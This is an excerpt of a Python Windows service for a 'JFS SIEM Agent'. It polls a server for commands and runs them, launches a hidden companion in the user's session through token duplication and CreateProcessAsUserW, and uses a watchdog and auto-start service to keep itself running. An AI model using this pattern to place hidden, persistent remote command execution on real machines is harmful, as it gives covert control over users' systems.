                    pass
                try:
                    _write_health(last_agent_loop=int(time.time()), last_events_collected=int(len(events)))
                except Exception:
                    pass
                for ev in events:
                    self.send_event(ev)
            except Exception as e:
                self._log(f"agent_loop exception: {repr(e)}")
            time.sleep(10)
        ...
        while self.agent_running:
            try:
                if not self._server_ip or not self._server_port:
                    time.sleep(5)
                    continue
                url = f"http://{self._server_ip}:{self._server_port}/SIEM/api/remote-access.php?action=get_pending_commands&agent={self._pc_name}"
                r = requests.get(url, timeout=5)
                try:
                    self._log(f'poll HTTP {r.status_code}')
                except Exception:
                    pass
                try:
                    _write_health(last_poll_ok=int(time.time()), last_poll_status=int(r.status_code))
                except Exception:
                    pass
                if r.status_code != 200:
                    time.sleep(2)
                ...
                for cmd_data in (data.get('commands') or []):
                    ...
                    try:
                        if isinstance(command, str) and command.lower().startswith('rt:'):
                            # Remote Terminal commands are handled by the user companion.
                            continue
                    except Exception:
                        pass
                    if cmd_id in self.executed_commands:
                    ...
                    self.executed_commands.add(cmd_id)
                    try:
                        self._log(f'cmd received id={cmd_id} command={command}')
                    except Exception:
                        pass
                    threading.Thread(target=self._execute_command_async, args=(cmd_id, command), daemon=True).start()
            except Exception as e:
                self._log(f"poll exception: {repr(e)}")
            time.sleep(2)


class _UserCompanionRunner:
    """Hidden user-session companion that executes Remote Terminal (rt:) commands as the logged-in user."""
    ...
    def load_agent_config(self):
        try:
            config_path = self._get_config_path()
            if not os.path.exists(config_path):
                self._log(f"companion config not found: {config_path}")
                return
            with open(config_path, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
            internal = cfg.get('internal', {})
            ...
            if internal.get('port'):
                self._server_port = str(internal.get('port'))
            self._log(f"companion config loaded internal={self._server_ip}:{self._server_port}")
        except Exception as e:
            self._log(f"companion load_agent_config exception: {repr(e)}")
    ...
    def _report_command(self, cmd_id, output: str, error: str):
        try:
            ...
            r = requests.post(url, json=payload, timeout=10)
            self._log(f"companion report_command HTTP {r.status_code}")
        except Exception as e:
            self._log(f"companion report_command exception: {repr(e)}")
        ...
        while self.agent_running:
            try:
                ...
                for cmd_data in (data.get('commands') or []):
                    cmd_id = cmd_data.get('id')
                    command = cmd_data.get('command')
                    if not (isinstance(command, str) and command.lower().startswith('rt:')):
                        continue
                    if cmd_id in self.executed_commands:
                        continue
                    self.executed_commands.add(cmd_id)
                ...
                self._log(f"companion poll exception: {repr(e)}")
            time.sleep(2)

    def _execute_command_async(self, cmd_id, command):
        try:
            self._shell.set_context(pc_name=self._pc_name, server_ip=self._server_ip, server_port=self._server_port)
            output, error = self._shell.execute(command, timeout_seconds=35)
            self._report_command(cmd_id, output, error)
        except Exception as e:
            self._report_command(cmd_id, '', str(e))
...
class JFSSIEMAgentWindowsService(win32serviceutil.ServiceFramework if win32serviceutil else object):
    _svc_name_ = "JFSSIEMAgent"
    _svc_display_name_ = "JFS SIEM Agent Service"
    _svc_description_ = "JFS SIEM Agent running as Windows Service"

    def __init__(self, args):
        if not win32serviceutil:
            raise RuntimeError('pywin32 service modules not available')
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.is_alive = True
        self.log_path = _service_log_setup_programdata()
        self._runner = None
        try:
            if servicemanager:
                servicemanager.LogInfoMsg(f'{self._svc_name_}: initialized (log={self.log_path})')
        except Exception:
            pass
    ...
    def SvcStop(self):
        ...
        try:
            if self._runner:
                self._runner.agent_running = False
        except Exception:
            pass
        try:
    ...
    def SvcDoRun(self):
        ...
        try:
            self._runner = _HeadlessAgentRunner(log_fn=_svc_log)
            self._runner.load_agent_config()
            self._runner.agent_running = True
            threading.Thread(target=self._runner.agent_loop, daemon=True).start()
            threading.Thread(target=self._runner.check_remote_commands, daemon=True).start()
            _svc_log(f'{self._svc_name_}: headless runner started')
        except Exception as e:
            try:
                if servicemanager:
                    servicemanager.LogErrorMsg(f'{self._svc_name_}: startup exception: {repr(e)}')
            except Exception:
                pass
            logging.exception('Service failed during startup: %s', e)
        ...
        try:
            if servicemanager:
                servicemanager.LogInfoMsg(f'{self._svc_name_}: exiting')
        except Exception:
            pass


def _watchdog_log_setup():
    try:
        log_path = None
        try:
            programdata = os.environ.get('PROGRAMDATA')
        ...
        if log_path:
            logging.info('watchdog logger initialized log=%s', log_path)
        return log_path
    except Exception:
        return None


def _watchdog_append(message: str):
    try:
        programdata = os.environ.get('PROGRAMDATA')
        if not programdata:
            return
...
def _is_agent_headless_running():
    try:
        for p in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
            try:
                ...
                cmdline_l = [str(x).lower() for x in cmdline]
                if '--run-agent-headless' in cmdline_l:
                    return True
            except Exception:
                continue
        return False
    ...
    try:
        for p in psutil.process_iter(['pid', 'cmdline', 'exe']):
            try:
                ...
                cmdline = info.get('cmdline') or []
                cmdline_l = [str(x).lower() for x in cmdline]
                if '--run-user-companion' in cmdline_l:
                    pid = info.get('pid')
                    if pid:
                        pids.append(int(pid))
            except Exception:
...
def _pid_session_id(pid: int):
    try:
        return int(psutil.Process(pid).session_id())
    except Exception:
        return None
...
def _start_agent_headless():
    try:
        ...
        # Spawn/ensure the agent runs in the active interactive user session (not Session 0)
        # when a user is logged in. If there is no active console session, fall back to Session 0.
        active_session = _get_active_console_session_id()

        try:
            logging.info('active console session id=%s', active_session)
        except Exception:
            pass
        try:
            _watchdog_append(f'active_console_session_id={active_session}')
        except Exception:
            pass

        pids = _find_headless_agent_pids()
        pid_sessions = {}
        try:
            for pid in pids:
                pid_sessions[pid] = _pid_session_id(pid)
        except Exception:
            pass

        try:
            logging.info('headless pids=%s pid_sessions=%s active_session=%s', pids, pid_sessions, active_session)
        except Exception:
            pass
        try:
            _watchdog_append(f'headless_pids={pids} pid_sessions={pid_sessions} active_session={active_session}')
        except Exception:
            pass

        if active_session is not None:
            # If there is already a headless agent in the active session, do nothing.
            try:
                for pid, sid in pid_sessions.items():
                    if sid == active_session:
                        logging.info('headless agent already running in active session pid=%s session=%s', pid, sid)
                        try:
                            _watchdog_append(f'already_running_in_active_session pid={pid} session={sid}')
                        except Exception:
                            pass
                        return True
            except Exception:
            ...
            # If headless is missing in active session (or only running in Session 0), spawn it into active session.
            try:
                pid = _start_agent_headless_in_active_session(active_session)
                logging.info('start in active session result pid=%s', pid)
                try:
                    _watchdog_append(f'start_in_active_session_result pid={pid} active_session={active_session}')
                except Exception:
                    pass
                if pid:
                    _write_headless_pid(pid)
                    # Optional: terminate Session 0 duplicates to prevent split-brain.
                    for opid, sid in pid_sessions.items():
                        try:
                            if sid == 0:
                                psutil.Process(opid).terminate()
                                logging.info('terminated session0 headless pid=%s', opid)
                                try:
                                    _watchdog_append(f'terminated_session0_headless pid={opid}')
                                except Exception:
                                    pass
                        except Exception:
                            pass
                ...
                try:
                    logging.exception('start_agent_headless_in_active_session failed: %s', e)
                except Exception:
                    pass
                try:
                    _watchdog_append(f'start_agent_headless_in_active_session_exception {repr(e)}')
                except Exception:
                    pass

        try:
            logging.warning('falling back to Session0 spawn via subprocess')
        except Exception:
            pass
        try:
            _watchdog_append('fallback_session0_subprocess_spawn')
        except Exception:
            pass
        subprocess.Popen(
            [sys.executable, '--run-agent-headless'],
            close_fds=True,
            creationflags=CREATE_NO_WINDOW,
            startupinfo=startupinfo
        )
...
def _start_user_companion_in_active_session(session_id: int):
    """Launch hidden user companion into the active interactive user session."""
    try:
        # Reuse the same CreateProcessAsUser implementation used for headless spawning.
        # This ensures the companion is running in the interactive session.
        ...
        CREATE_NO_WINDOW_LOCAL = 0x08000000
        ...
        def _enable_priv(priv_name: str) -> bool:
            try:
                hproc = kernel32.GetCurrentProcess()
                htok = HANDLE()
                if not advapi32.OpenProcessToken(hproc, DWORD(0x0020 | 0x0008), ctypes.byref(htok)):
                    return False
                luid = LUID()
        ...
        try:
            _enable_priv(SE_INCREASE_QUOTA_NAME)
            _enable_priv(SE_ASSIGNPRIMARYTOKEN_NAME)
        except Exception:
            pass

        user_token = HANDLE()
        if not wtsapi32.WTSQueryUserToken(DWORD(session_id), ctypes.byref(user_token)):
            try:
                _watchdog_append(f'companion WTSQueryUserToken_failed session_id={session_id} gle={_gle()}')
            except Exception:
                pass
            return None

        primary_token = HANDLE()
        if not advapi32.DuplicateTokenEx(user_token, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, ctypes.byref(primary_token)):
            try:
                _watchdog_append(f'companion DuplicateTokenEx_failed gle={_gle()}')
            except Exception:
                pass
            try:
        ...
        try:
            userenv.CreateEnvironmentBlock(ctypes.byref(env_ptr), primary_token, False)
        except Exception:
            env_ptr = ctypes.c_void_p()

        exe_path = sys.executable
        cmdline = f'"{exe_path}" --run-user-companion'
        ...
        ok = advapi32.CreateProcessAsUserW(
            ...
            None,
            False,
            DWORD(CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW_LOCAL),
            env_ptr,
            None,
            ctypes.byref(si),
            ctypes.byref(pi)
        ...
        if ok:
            try:
                ...
                try:
                    _watchdog_append(f'companion started pid={pid} session_id={session_id}')
                except Exception:
                    pass
                return pid
            except Exception:
        ...
        try:
            _watchdog_append(f'companion CreateProcessAsUser_failed gle={_gle()}')
        except Exception:
            pass
        return None
    except Exception:
...
def _start_agent_headless_in_active_session(session_id: int):
    """Launch the headless agent into the active interactive user session."""
    try:
        advapi32 = ctypes.windll.advapi32
        kernel32 = ctypes.windll.kernel32
        wtsapi32 = ctypes.windll.wtsapi32
        ...
        # Function prototypes
        wtsapi32.WTSQueryUserToken.argtypes = [DWORD, ctypes.POINTER(HANDLE)]
        wtsapi32.WTSQueryUserToken.restype = BOOL

        advapi32.DuplicateTokenEx.argtypes = [HANDLE, DWORD, ctypes.c_void_p, DWORD, DWORD, ctypes.POINTER(HANDLE)]
        ...
        advapi32.AdjustTokenPrivileges.argtypes = [HANDLE, BOOL, ctypes.POINTER(TOKEN_PRIVILEGES), DWORD, ctypes.c_void_p, ctypes.c_void_p]
        ...
        userenv.CreateEnvironmentBlock.argtypes = [ctypes.POINTER(ctypes.c_void_p), HANDLE, BOOL]
        ...
        if not wtsapi32.WTSQueryUserToken(DWORD(session_id), ctypes.byref(user_token)):
            try:
                logging.error('WTSQueryUserToken failed session_id=%s gle=%s', session_id, _gle())
            except Exception:
                pass
            try:
                _watchdog_append(f'WTSQueryUserToken_failed session_id={session_id} gle={_gle()}')
            except Exception:
                pass
            return False
        ...
        if not advapi32.DuplicateTokenEx(
            ...
            try:
                logging.error('DuplicateTokenEx failed gle=%s', _gle())
            except Exception:
                pass
            try:
                _watchdog_append(f'DuplicateTokenEx_failed gle={_gle()}')
            except Exception:
                pass
            try:
                kernel32.CloseHandle(user_token)
        ...
        # Build command line
        exe_path = sys.executable
        cmdline = f'"{exe_path}" --run-agent-headless'
        ...
        env = ctypes.c_void_p()
        try:
            if not userenv.CreateEnvironmentBlock(ctypes.byref(env), primary_token, False):
                env = ctypes.c_void_p()
        except Exception:
            env = ctypes.c_void_p()
        ...
        ok = advapi32.CreateProcessAsUserW(
            ...
            None,
            False,
            CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW_LOCAL,
        ...
        if not ok:
            try:
                logging.error('CreateProcessAsUserW failed gle=%s session_id=%s cmd=%s', _gle(), session_id, cmdline)
            except Exception:
                pass
            try:
                _watchdog_append(f'CreateProcessAsUserW_failed gle={_gle()} session_id={session_id}')
            except Exception:
                pass
...
def run_watchdog_loop(poll_seconds=5):
    _watchdog_log_setup()
    logging.info('watchdog loop started poll_seconds=%s exe=%s', poll_seconds, sys.executable)
    try:
        _watchdog_append(f'watchdog_loop_started poll_seconds={poll_seconds} exe={sys.executable}')
    except Exception:
        pass

    lock_fd = _acquire_watchdog_lock()
    if lock_fd is None:
        try:
            _watchdog_append('another_watchdog_instance_detected exiting')
        except Exception:
            pass
        return

    # If a previous build wrote a stale PID (e.g., v3), clear it so we can start the correct headless.
    try:
        tracked_pid = _read_headless_pid()
        if tracked_pid and not _is_valid_headless_pid(tracked_pid):
            _watchdog_append(f'clearing_stale_headless_pid pid={tracked_pid}')
            _clear_headless_pid()
    except Exception:
        pass

    try:
        last_headless_spawn = 0.0
        last_companion_spawn = 0.0

        while True:
            try:
                tracked_pid = _read_headless_pid()
                tracked_ok = bool(tracked_pid) and _is_valid_headless_pid(tracked_pid)
                ...
                # If we see any headless process, treat it as authoritative and track it.
                # This prevents repeated spawning when pidfile is missing or validation is too strict.
                if pids:
                    try:
                        _write_headless_pid(int(pids[0]))
                        tracked_pid = int(pids[0])
                        tracked_ok = True
                    except Exception:
                        pass

                try:
                    _watchdog_append(f'cycle tracked_pid={tracked_pid} tracked_ok={tracked_ok} scan_pids={pids}')
                except Exception:
                    pass

                # Stuck detection: if headless is alive but not polling/sending, kill and restart.
                try:
                    now_ts = int(time.time())
                    health = _read_health() or {}
                    last_poll_ok = int(health.get('last_poll_ok') or 0)
                    last_agent_loop = int(health.get('last_agent_loop') or 0)
                    # If we have a valid headless but it hasn't polled or looped recently, consider it stuck.
                    if tracked_ok and tracked_pid:
                        poll_stale = (now_ts - last_poll_ok) > 180 if last_poll_ok else False
                        loop_stale = (now_ts - last_agent_loop) > 180 if last_agent_loop else False
                        if poll_stale or loop_stale:
                            _watchdog_append(f'headless_stuck_detected pid={tracked_pid} poll_stale={poll_stale} loop_stale={loop_stale} last_poll_ok={last_poll_ok} last_agent_loop={last_agent_loop}')
                            try:
                                psutil.Process(int(tracked_pid)).terminate()
                            except Exception:
                                pass
                            time.sleep(2)
                            try:
                                if psutil.pid_exists(int(tracked_pid)):
                                    psutil.Process(int(tracked_pid)).kill()
                            except Exception:
                                pass
                            try:
                                _clear_headless_pid()
                                ...
                                pass
                            try:
                                _clear_file_in_programdata('headless.lock')
                                _clear_file_in_programdata('health.json')
                            except Exception:
                                pass
                            tracked_pid = None
                            tracked_ok = False
                ...
                # If we have no valid headless, start one.
                if (not tracked_ok) and (not pids):
                    logging.warning('agent headless not running; starting')
                    try:
                        _watchdog_append('agent_headless_not_running starting')
                    except Exception:
                        pass
                    now = time.time()
                    if (now - last_headless_spawn) >= 30:
                        ok = _start_agent_headless()
                        last_headless_spawn = now
                        logging.info('start agent headless result=%s', ok)
                        try:
                            _watchdog_append(f'start_agent_headless_result={ok}')
                        except Exception:
                            pass
                    else:
                        try:
                            _watchdog_append('headless_spawn_suppressed cooldown_active')
                        except Exception:
                            pass
                elif (not tracked_ok) and pids:
                    # Update pid file to one of the detected headless processes.
                    try:
                        _write_headless_pid(int(pids[0]))
                        _watchdog_append(f'updated_tracked_pid_from_scan pid={int(pids[0])}')
                    except Exception:
                        pass

                # Ensure the user companion is running in the active interactive session.
                try:
                    active_session = _get_active_console_session_id()
                    if active_session is not None:
                        comp_pids = _find_user_companion_pids()
                        comp_ok = False
                        for cpid in comp_pids:
                            try:
                                if _pid_session_id(cpid) == active_session:
                                    comp_ok = True
                                    break
                            except Exception:
                                continue
                        if not comp_ok:
                            now = time.time()
                            if (now - last_companion_spawn) >= 30:
                                _watchdog_append(f'companion_not_running starting active_session={active_session}')
                                _start_user_companion_in_active_session(active_session)
                                last_companion_spawn = now
                            else:
                                _watchdog_append('companion_spawn_suppressed cooldown_active')
                except Exception:
                    pass
                ...
                try:
                    ...
                    pass
                try:
                    _watchdog_append(f'watchdog_loop_error {repr(e)}')
                except Exception:
                    pass
                time.sleep(poll_seconds)
    finally:
...
def _acquire_watchdog_lock():
    lock_path = _get_watchdog_lock_path()
    if not lock_path:
        return None
    try:
        fd = os.open(lock_path, os.O_CREAT | os.O_EXCL | os.O_RDWR)
        ...
        # Might be a stale lock. If PID inside is not alive, remove it and retry once.
        try:
            with open(lock_path, 'r', encoding='utf-8') as f:
                txt = (f.read() or '').strip()
            stale_pid = int(txt) if txt else None
        ...
        if not is_alive:
            try:
                ...
                pass
            try:
                fd2 = os.open(lock_path, os.O_CREAT | os.O_EXCL | os.O_RDWR)
                try:
                    os.write(fd2, str(os.getpid()).encode('utf-8'))
                except Exception:
                    pass
                return fd2
            except Exception:
...
class JFSSIEMAgentWatchdogService(win32serviceutil.ServiceFramework if win32serviceutil else object):
    _svc_name_ = "JFSSIEMAgentWatchdog"
    _svc_display_name_ = "JFS SIEM Agent Watchdog"
    _svc_description_ = "Restarts the JFS SIEM Agent headless process if it is not running"
    ...
    def __init__(self, args):
        ...
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.is_alive = True
        self.log_path = _watchdog_log_setup()
    ...
    def SvcDoRun(self):
        ...
        try:
            ...
            try:
                logging.exception('failed to start watchdog loop: %s', e)
            except Exception:
                pass
...
if __name__ == '__main__':
    ...
    if '--run-agent-headless' in args:
        if not _acquire_instance_lock('headless.lock'):
            try:
                # Another headless instance already holds the lock.
                sys.exit(0)
            except Exception:
                pass
        # Run agent in background without any GUI/tk objects.
        log_path = None
        try:
            log_path = _service_log_setup_programdata()
        except Exception:
            log_path = None
        try:
            logging.info('headless agent starting (no GUI) pid=%s log=%s', os.getpid(), log_path)
        except Exception:
            pass

        runner = None
        try:
            runner = _HeadlessAgentRunner(log_fn=lambda msg: logging.info(msg))
            runner.load_agent_config()
            runner.agent_running = True
        except Exception as e:
            try:
                logging.exception('headless runner init failed: %s', e)
            except Exception:
                pass

        if runner is not None:
            try:
                threading.Thread(target=runner.agent_loop, daemon=True).start()
            except Exception:
                pass
            try:
                threading.Thread(target=runner.check_remote_commands, daemon=True).start()
            except Exception:
                pass
            try:
                # External polling may not exist in some builds; ignore if absent.
                if hasattr(runner, 'check_remote_commands_external'):
                    threading.Thread(target=runner.check_remote_commands_external, daemon=True).start()
            except Exception:
                pass

        # Heartbeat so we can see it's alive even if no events are collected.
        while True:
            try:
                logging.info('headless heartbeat pid=%s', os.getpid())
            except Exception:
                pass
            time.sleep(30)

    if '--run-user-companion' in args:
        if not _acquire_instance_lock('companion.lock'):
            try:
                sys.exit(0)
            except Exception:
                pass
        # Run user-session companion (no UI) that executes Remote Terminal rt: commands
        ...
        try:
            ...
            log_path = None
        try:
            logging.info('user companion starting pid=%s log=%s', os.getpid(), log_path)
        except Exception:
            pass

        runner = None
        try:
            runner = _UserCompanionRunner(log_fn=lambda msg: logging.info(msg))
            runner.load_agent_config()
            runner.agent_running = True
        except Exception as e:
            try:
                logging.exception('user companion init failed: %s', e)
            except Exception:
                pass
        ...
        while True:
            try:
                logging.info('companion heartbeat pid=%s', os.getpid())
            except Exception:
                pass
            time.sleep(30)
    ...
    if '--install-service' in args:
        ...
        bin_path = f'\\"{exe_path}\\" --run-service'
        subprocess.run("sc stop JFSSIEMAgent", shell=True, capture_output=True, text=True)
        subprocess.run("sc delete JFSSIEMAgent", shell=True, capture_output=True, text=True)
        create_cmd = f"sc create JFSSIEMAgent binPath= \"{bin_path}\" start= auto"
        create_res = subprocess.run(create_cmd, shell=True, capture_output=True, text=True)
        if create_res.returncode != 0:
            err_text = (create_res.stdout or "") + ("\n" + create_res.stderr if create_res.stderr else "")
            try:
                if getattr(sys, 'stderr', None):
                    sys.stderr.write(err_text)
            except Exception:
                pass
            sys.exit(create_res.returncode)
        subprocess.run("sc description JFSSIEMAgent \"JFS SIEM Agent Service\"", shell=True, capture_output=True, text=True)
        start_res = subprocess.run("sc start JFSSIEMAgent", shell=True, capture_output=True, text=True)
        if start_res.returncode != 0:
            err_text = (start_res.stdout or "") + ("\n" + start_res.stderr if start_res.stderr else "")
            try:
                if getattr(sys, 'stderr', None):
                    sys.stderr.write(err_text)
            except Exception:
                pass
            sys.exit(start_res.returncode)
    ...
    if '--remove-watchdog' in args:
        subprocess.run("sc stop JFSSIEMAgentWatchdog", shell=True, capture_output=True, text=True)
        subprocess.run("sc delete JFSSIEMAgentWatchdog", shell=True, capture_output=True, text=True)
        sys.exit(0)

    if '--run-watchdog' in args:
        # Service entrypoint for watchdog; managed by SCM.
        try:
            if servicemanager and win32serviceutil:
                servicemanager.Initialize()
                servicemanager.PrepareToHostSingle(JFSSIEMAgentWatchdogService)
                servicemanager.StartServiceCtrlDispatcher()
        except Exception as e:
            try:
                _watchdog_log_setup()
                logging.exception('watchdog service entrypoint failed: %s', e)
            except Exception:
                pass
        sys.exit(0)
    ...
    if '--run-service' in args:
        if not win32serviceutil:
            sys.stderr.write('pywin32 service modules not available\n')
            sys.exit(1)
        try:
            if servicemanager:
                servicemanager.Initialize()
                servicemanager.PrepareToHostSingle(JFSSIEMAgentWindowsService)
                servicemanager.StartServiceCtrlDispatcher()
            else:
                win32serviceutil.HandleCommandLine(JFSSIEMAgentWindowsService)
        except Exception:
            win32serviceutil.HandleCommandLine(JFSSIEMAgentWindowsService)
        sys.exit(0)
